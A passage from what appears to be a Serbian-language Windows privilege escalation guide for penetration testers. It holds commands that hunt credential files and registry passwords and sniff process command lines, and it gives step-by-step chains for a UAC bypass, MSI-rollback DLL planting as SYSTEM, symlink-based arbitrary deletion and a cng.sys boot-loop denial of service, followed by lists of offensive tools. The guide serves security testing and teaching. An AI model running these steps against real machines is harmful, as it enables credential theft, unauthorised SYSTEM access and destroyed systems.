%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tražite sve predložene fajlove:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Kredencijali u RecycleBin

Trebalo bi takođe da proverite Bin da biste potražili kredencijale unutra

Za **oporavak lozinki** sačuvanih od strane nekoliko programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Druge moguće registry ključeve sa kredencijalima**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Izdvajanje openssh ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proveriš db-ove gde se čuvaju lozinke iz **Chrome** ili **Firefox**.\
Takođe proveri istoriju, obeleživače i favorite pregledača, jer su možda i tamo sačuvane neke **lozinke**.

Alati za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u Windows operativni sistem koja omogućava **međusobnu komunikaciju** između softverskih komponenti različitih jezika. Svaka COM komponenta je **identifikovana preko class ID (CLSID)**, a svaka komponenta izlaže funkcionalnost preko jedne ili više interfejsa, identifikovanih preko interface IDs (IIDs).

COM klase i interfejsi su definisani u registru pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** redom. Ovaj registar nastaje spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možeš pronaći podregistar **InProcServer32** koji sadrži **default value** koja pokazuje na **DLL** i vrednost pod nazivom **ThreadingModel** koja može biti **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ili **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

U suštini, ako možeš da **prepišeš bilo koji od DLL-ova** koji će biti izvršeni, mogao bi da **eskaliraš privilegije** ako će taj DLL biti izvršen od strane drugog korisnika.

Da saznaš kako napadači koriste COM Hijacking kao mehanizam perzistencije pogledaj:


{{#ref}}
com-hijacking.md
{{endref}}

### **Generička pretraga lozinki u fajlovima i registru**

**Pretraži sadržaj fajlova**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Pretraga fajla sa određenim nazivom**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pretraži registry za nazive ključeva i lozinke**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Alati koji traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin. Napravio sam ovaj plugin da bi **automatski izvršavao svaki metasploit POST modul koji traži credentials** unutar žrtve.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski traži sve fajlove koji sadrže lozinke pomenute na ovoj strani.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izdvajanje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sessions**, **usernames** i **passwords** za nekoliko alata koji čuvaju ove podatke u plain text-u (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) **sa punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali nasleđuje sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **potpun pristup procesu sa niskim privilegijama**, možete preuzeti **otvoreni handle ka privilegovanom procesu koji je kreiran** pomoću `OpenProcess()` i **ubrizgati shellcode**.\
[Pogledajte ovaj primer za više informacija o **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pogledajte ovaj **drugi post za potpunije objašnjenje o tome kako testirati i zloupotrebiti više otvorenih handle-ova procesa i thread-ova nasleđenih sa različitim nivoima dozvola (ne samo pun pristup)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Deljeni memorijski segmenti, poznati kao **pipes**, omogućavaju komunikaciju procesa i prenos podataka.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na client/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **client** pošalje podatke kroz pipe, **server** koji je postavio pipe može da **preuzme identitet** **client-a**, pod uslovom da ima potrebna **SeImpersonate** prava. Identifikovanje **privilegovanog procesa** koji komunicira putem pipe-a koji možete da imitirete pruža priliku da **stečete više privilegije** preuzimanjem identiteta tog procesa kada stupi u interakciju sa pipe-om koji ste postavili. Za uputstva za izvođenje takvog napada, korisni vodiči mogu se naći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava da **presretnete komunikaciju named pipe-a pomoću alata kao što je burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava da izlistate i vidite sve pipe-ove kako biste pronašli privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u server modu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentikovani client može da zloupotrebi async event putanju zasnovanu na mailslot-u da pretvori `ClientAttach` u proizvoljan **4-byte write** na bilo koji postojeći fajl koji je upisiv za `NETWORK SERVICE`, zatim dobije Telephony admin prava i učita proizvoljan DLL kao servis. Kompletan tok:

- `ClientAttach` sa `pszDomainUser` postavljenim na postojeću putanju koja je upisiva → servis ga otvara preko `CreateFileW(..., OPEN_EXISTING)` i koristi ga za async event upise.
- Svaki event upisuje napadačev `InitContext` iz `Initialize` na taj handle. Registrujte line app sa `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite putem `GetAsyncEvents` (`Req_Func 0`), zatim se odjavite/ugasite da biste ponovili determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, zatim pozovite `GetUIDllName` sa proizvoljnom putanjom do DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klikabilni Markdown linkovi prosleđeni u `ShellExecuteExW` mogu da pokrenu opasne URI handlere (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše fajlove pod kontrolom napadača kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i koji **prosleđuju kredencijale na command line-u**. Skripta ispod hvata command line-ove procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim stanjem, ispisujući sve razlike.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Krađa lozinki iz procesa

## Od Low Priv User do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko konzole ili RDP) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao "NT\AUTHORITY SYSTEM" iz neprivilegovanog korisnika.

Ovo omogućava eskalaciju privilegija i zaobilaženje UAC-a istovremeno, pomoću iste ranjivosti. Dodatno, nema potrebe da se bilo šta instalira, a binarni fajl korišćen tokom procesa je potpisan i izdat od strane Microsoft-a.

Neki od pogođenih sistema su sledeći:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Da bi se iskoristila ova ranjivost, neophodno je izvršiti sledeće korake:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Iz Administrator Medium do High Integrity Level / UAC Bypass

Pročitaj ovo da bi **naučio o Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitaj ovo da bi naučio o UAC i UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Od Arbitrary Folder Delete/Move/Rename do SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) sa exploit code [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Napad se u osnovi sastoji od zloupotrebe Windows Installer rollback funkcije da bi se legitimni fajlovi zamenili malicioznim tokom procesa deinstalacije. Za to napadač treba da kreira **malicious MSI installer** koji će se koristiti za hijacking foldera `C:\Config.Msi`, koji će kasnije Windows Installer koristiti za skladištenje rollback fajlova tokom deinstalacije drugih MSI paketa, pri čemu bi rollback fajlovi bili modifikovani tako da sadrže malicious payload.

Sažeta tehnika je sledeća:

1. **Stage 1 – Priprema za Hijack (ostavi `C:\Config.Msi` praznim)**

- Step 1: Install the MSI
- Kreiraj `.msi` koji instalira bezopasan fajl (npr. `dummy.txt`) u writable folder (`TARGETDIR`).
- Označi installer kao **"UAC Compliant"**, tako da ga **non-admin user** može pokrenuti.
- Održi **handle** otvoren na fajl nakon instalacije.

- Step 2: Započni Uninstall
- Deinstaliraj isti `.msi`.
- Proces deinstalacije počinje da premešta fajlove u `C:\Config.Msi` i preimenuje ih u `.rbf` fajlove (rollback backups).
- **Poll open file handle** koristeći `GetFinalPathNameByHandle` da otkriješ kada fajl postane `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` uključuje **custom uninstall action (`SyncOnRbfWritten`)** koja:
- Signalizira kada je `.rbf` upisan.
- Zatim **waits** na drugi event pre nego što nastavi deinstalaciju.

- Step 4: Blokiraj Brisanje `.rbf`
- Kada se signalizira, **otvori `.rbf` fajl** bez `FILE_SHARE_DELETE` — ovo **sprečava njegovo brisanje**.
- Zatim **signal back** tako da deinstalacija može da se završi.
- Windows Installer ne uspeva da obriše `.rbf`, i pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Step 5: Ručno Obriši `.rbf`
- Ti (napadač) ručno brišeš `.rbf` fajl.
- Sada je **`C:\Config.Msi` prazan**, spreman za hijacking.

> U ovom trenutku, **pokreni SYSTEM-level arbitrary folder delete vulnerability** da obrišeš `C:\Config.Msi`.

2. **Stage 2 – Zamena Rollback Skripti Malicious-om**

- Step 6: Ponovo kreiraj `C:\Config.Msi` sa Weak ACLs
- Ponovo kreiraj folder `C:\Config.Msi` sam.
- Postavi **weak DACLs** (npr. Everyone:F), i **zadrži otvoren handle** sa `WRITE_DAC`.

- Step 7: Pokreni Drugu Instalaciju
- Instaliraj `.msi` ponovo, sa:
- `TARGETDIR`: Writable location.
- `ERROROUT`: Varijabla koja pokreće forced failure.
- Ova instalacija će se koristiti da ponovo pokrene **rollback**, koji čita `.rbs` i `.rbf`.

- Step 8: Prati `.rbs`
- Koristi `ReadDirectoryChangesW` da nadgledaš `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
- Zabeleži njegovo ime fajla.

- Step 9: Sync Pre Rollback
- `.msi` sadrži **custom install action (`SyncBeforeRollback`)** koja:
- Signalizira event kada je `.rbs` kreiran.
- Zatim **waits** pre nego što nastavi.

- Step 10: Ponovo Primeni Weak ACL
- Nakon prijema event-a `rbs created`:
- Windows Installer **ponovo primenjuje strong ACLs** na `C:\Config.Msi`.
- Ali pošto i dalje imaš handle sa `WRITE_DAC`, možeš **ponovo da primeniš weak ACLs**.

> ACLs se **primenjuju samo pri otvaranju handle-a**, tako da i dalje možeš da pišeš u folder.

- Step 11: Ubaci Lažni `.rbs` i `.rbf`
- Overwrite `.rbs` fajl sa **fake rollback script** koji govori Windows-u da:
- Vrati tvoj `.rbf` fajl (malicious DLL) u **privileged location** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Ubaci svoj lažni `.rbf` koji sadrži **malicious SYSTEM-level payload DLL**.

- Step 12: Pokreni Rollback
- Signaliziraj sync event tako da installer nastavi.
- **type 19 custom action (`ErrorOut`)** je konfigurisana da **namerno failuje instalaciju** na poznatoj tački.
- Ovo uzrokuje da **rollback** počne.

- Step 13: SYSTEM Instalira Tvoj DLL
- Windows Installer:
- Čita tvoj malicious `.rbs`.
- Kopira tvoj `.rbf` DLL u target lokaciju.
- Sada imaš svoj **malicious DLL u SYSTEM-loaded path-u**.

- Final Step: Izvrši SYSTEM Code
- Pokreni trusted **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL koji si hijackovao.
- **Boom**: Tvoj code se izvršava **kao SYSTEM**.


### Od Arbitrary File Delete/Move/Rename do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možeš da obrišeš **ceo folder** (npr. `C:\Config.Msi`). Ali šta ako tvoja vulnerability dozvoljava samo **arbitrary file deletion** ?

Možeš iskoristiti **NTFS internals**: svaki folder ima skriveni alternate data stream koji se zove:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ovaj stream čuva **indeksne metapodatke** fascikle.

Dakle, ako **obrišete `::$INDEX_ALLOCATION` stream** fascikle, NTFS **uklanja celu fasciklu** iz filesystem-a.

To možete uraditi pomoću standardnih API-ja za brisanje fajlova kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Iako pozivate API za brisanje *fajla*, on **briše samu fasciklu**.

### From Folder Contents Delete to SYSTEM EoP
Šta ako vaš primitive ne dozvoljava da brišete proizvoljne fajlove/fascikle, ali **dozvoljava brisanje *sadržaja* fascikle pod kontrolom napadača**?

1. Korak 1: Postavite mamac fasciklu i fajl
- Kreirajte: `C:\temp\folder1`
- Unutar nje: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Korak 3: Pokreni SYSTEM proces (npr. `SilentCleanup`)
- Ovaj proces skenira foldere (npr. `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada stigne do `file1.txt`, **oplock se aktivira** i predaje kontrolu tvom callback-u.

4. Korak 4: Unutar oplock callback-a – preusmeri brisanje

- Opcija A: Premesti `file1.txt` na drugo mesto
- Ovo prazni `folder1` bez narušavanja oplock-a.
- Nemoj direktno da brišeš `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvori `folder1` u **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcija C: Napravite **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Ovo cilja NTFS interni stream koji čuva metapodatke fascikle — brisanjem njega briše se fascikla.

5. Step 5: Release the oplock
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Rezultat**: `C:\Config.Msi` je obrisan od strane SYSTEM-a.

### Od Arbitrary Folder Create do Permanent DoS

Iskoristite primitivu koja vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete fajlove** ili **postavljate slabe permisije**.

Kreirajte **fasciklu** (ne fajl) sa imenom **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```
- Ova putanja obično odgovara `cng.sys` kernel-mode driveru.
- Ako je **pre-creatorš kao folder**, Windows ne uspeva da učita pravi driver pri boot-u.
- Zatim Windows pokušava da učita `cng.sys` tokom boot-a.
- Vidí folder, **ne uspeva da resolve-uje pravi driver**, i **crashuje ili zaustavlja boot**.
- Nema **fallback-a**, i nema **recovery-ja** bez spoljne intervencije (npr. boot repair ili pristup disku).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Kada **privileged service** upisuje logove/izvoze na putanju pročitanu iz **writable config-a**, preusmeri tu putanju pomoću **Object Manager symlinks + NTFS mount points** da bi privileged write pretvorio u arbitrary overwrite (čak i **bez** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Config koji čuva target putanju je writable od strane napadača (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Privileged operacija koja upisuje na tu putanju (log, export, report).

**Example chain**
1. Pročitaj config da bi se dobila privileged log destinacija, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmeri putanju bez admin prava:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. admin pokrene "send test SMS"). Upis sada završava u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisani target (hex/PE parser) da potvrdite oštećenje; reboot primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se takođe može generalizovati na bilo koji zaštićeni fajl koji će privilegovana usluga otvoriti za write.

> `cng.sys` se normalno učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys` može se prvo pokušati sa njom, što je čini pouzdanim DoS odvodom za oštećene podatke.



## **Od High Integrity do System**

### **Nova usluga**

Ako već radite u procesu sa High Integrity, **put do SYSTEM** može biti lak, samo **kreiranjem i izvršavanjem nove usluge**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Kada pravite service binary, proverite da li je validan service ili da binary izvršava neophodne radnje dovoljno brzo, jer će biti ubijen za 20s ako nije validan service.

### AlwaysInstallElevated

Iz procesa sa High Integrity možete pokušati da **omogućite AlwaysInstallElevated registry entries** i **instalirate** reverse shell koristeći _**.msi**_ wrapper.\
[Više informacija o uključenim registry ključevima i o tome kako da instalirate _.msi_ paket ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Možete** [**naći kod ovde**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate ta token privileges (verovatno ćete to naći u već postojećem High Integrity procesu), moći ćete da **otvorite skoro svaki process** (ne zaštićene procese) sa SeDebug privilegijom, **kopirate token** procesa i kreirate **arbitrary process sa tim tokenom**.\
Ova tehnika se obično koristi da bi se izabrao bilo koji process koji radi kao SYSTEM sa svim token privileges (_da, možete naći SYSTEM procese bez svih token privileges_).\
**Možete naći** [**primer koda koji izvršava predloženu tehniku ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Tehnika se sastoji od **kreiranja pipe-a i zatim kreiranja/zloupotrebe service-a da upisuje na taj pipe**. Zatim će **server** koji je kreirao pipe koristeći **`SeImpersonate`** privilege moći da **impersonira token** klijenta pipe-a (service-a), čime dobija SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes trebalo bi da pročitate ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**kako preći sa high integrity na System koristeći name pipes trebalo bi da pročitate ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete dll** koji se **učitava** od strane **process-a** koji radi kao **SYSTEM**, moći ćete da izvršavate arbitrary code sa tim permissions. Zato je Dll Hijacking takođe koristan za ovakav tip privilege escalation, a uz to je i mnogo **lakši za postizanje iz procesa sa high integrity**, jer će on imati **write permissions** nad folderima koji se koriste za učitavanje dll-ova.\
**Možete** [**saznati više o Dll hijacking ovde**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najbolji alat za pronalaženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava misconfigurations i sensitive files (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće misconfigurations i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstrahuje PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP informacije o sačuvanim sesijama. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstrahuje crendentials iz Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray prikupljene lozinke kroz domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS spoofer i man-in-the-middle alat.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeration za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalna proveravanja **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerira host tražeći misconfigurations (više alat za prikupljanje informacija nego za privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstrahuje credentials iz mnogo softvera (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava misconfiguration (executabile precompiled in github). Not recommended. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće misconfigurations (exe from python). Not recommended. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat kreiran na osnovu ovog posta (ne treba accesschk da bi radio pravilno, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz **systeminfo** i preporučuje exploite koji rade (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz **systeminfo** i preporučuje exploite koji rade (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Morate da kompajlirate projekat koristeći ispravnu verziju .NET ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET na victim host-u, možete uraditi:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Reference

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
